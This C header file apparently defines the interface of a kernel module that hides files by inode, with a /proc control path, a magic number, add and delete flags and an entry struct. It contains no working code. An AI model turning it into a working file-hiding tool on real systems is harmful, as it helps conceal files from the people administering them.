#ifndef __HENTRY_H
#define __HENTRY_H

#define HIDE_PROC_ENTRY "/proc/hide2169/hidefileino"


#define HIDE_MAGIC 2169
#define HIDE_ADD 1
#define HIDE_DEL 2

typedef unsigned long long u64;

struct hentry {
	unsigned int magic;
	unsigned int flag;	
	u64 ino;		
};

#endif /* end of hentry.h */
